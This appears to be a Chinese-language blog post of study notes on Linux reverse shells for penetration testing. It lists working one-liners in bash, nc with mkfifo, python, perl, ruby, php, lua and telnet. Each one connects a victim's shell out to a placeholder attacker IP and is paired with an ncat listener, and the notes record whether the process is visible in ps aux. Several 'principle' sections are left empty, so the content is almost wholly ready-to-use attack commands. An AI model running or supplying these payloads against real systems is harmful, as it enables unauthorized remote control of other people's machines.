---
title: Linux 反弹shell实践
category: Sec
---

## Linux 反弹shell实践

### 0x00 前述

在很多渗透场景下我们都需要反弹shell。

这里的`shell`指的是靶机监听某端口，一旦有外部流量接入就分配一个shell；`反弹shell`则指攻击者的机器上监听某端口，靶机主动去连接这个端口并分配给攻击者一个shell。

`反弹shell`在以下两种环境中具有独特优势：

1. 靶机没有公网IP（或者说，没有能够直接被攻击者访问到的IP）
2. 靶机本身或所在网络的防火墙对出口流量不做限制或限制小

网络上已经有很多关于这方面的文章。本文为学习笔记。

### 0x01 反弹shell：bash

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
bash -i >& /dev/tcp/[ATTACKER-IP]/10000 0>&1
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-0.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-1.png)

注意上面的靶机只有一个内网地址`192.168.246.xxx`。

**原理**

### 0x02 反弹shell：nc

对于靶机上的`nc`能够通过`-e`方式执行shell的情况不再叙述，大部分靶机可能都不能用`-e`选项。这里考察`-e`选项不能使用的情况。

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER-IP] 10000 >/tmp/f
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-11.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-10.png)

反弹shell进程在`ps aux`中可以检索到。

**原理**

### 0x03 反弹shell：python

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[ATTACKER-IP]",10000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-3.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-2.png)

反弹shell进程在`ps aux`中可以检索到。

**原理**

### 0x04 反弹shell：perl

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
perl -e 'use Socket;$i="[ATTACKER-IP]";$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-5.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-4.png)

反弹shell进程在`ps aux`中不能检索到。

**原理**

### 0x05 反弹shell：ruby

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
ruby -rsocket -e'f=TCPSocket.open("[ATTACKER-IP]",10000).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-7.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-6.png)

反弹shell进程在`ps aux`中不能检索到。

**原理**

### 0x06 反弹shell：php

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
php -r '$sock=fsockopen("[ATTACKER-IP]",10000);exec("/bin/sh -i <&3 >&3 2>&3");'
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-9.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-8.png)

反弹shell进程在`ps aux`中可以检索到。

注：代码假设TCP连接的文件描述符为`3`。

**原理**

### 0x07 反弹shell：lua

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
lua -e "require('socket');require('os');t=socket.tcp();t:connect('[ATTACKER-IP]','10000');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

靶机上没有`lua`，我用

```bash
apt-get install lua5.2
```

安装，然而运行上面的命令时报错：

```
lua: (command line):1: module 'socket' not found:
```

### 0x08 反弹shell：telnet

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet [ATTACKER-IP] 10000 >/tmp/f
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-13.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-12.png)

反弹shell进程在`ps aux`中可以检索到。

**原理**

与`nc`中的原理相同，只是把`nc`换成了`telnet`。

### 0x09 反弹shell：bash-2

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
exec 5<>/dev/tcp/[ATTACKER-IP]/10000;cat <&5 | while read line; do $line 2>&5 >&5; done
```

靶机截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-15.png)

攻击者截图：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-14.png)

这个反弹shell的管道功能和重定向功能有问题。

**原理**

### 0x0A 参考

- [linux下反弹shell的几种方法](http://blog.csdn.net/u012985855/article/details/64117187?utm_source=itdadao&utm_medium=referral)
- [Linux下反弹shell笔记](https://www.cnblogs.com/deen-/p/7237327.html)
- [关于Linux的反弹shell命令的解析](http://os.51cto.com/art/201709/550457.htm)
- [Linux下反弹shell方法](https://www.waitalone.cn/linux-shell-rebound-under-way.html)
- [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse Shell with Bash](http://www.gnucitizen.org/blog/reverse-shell-with-bash/)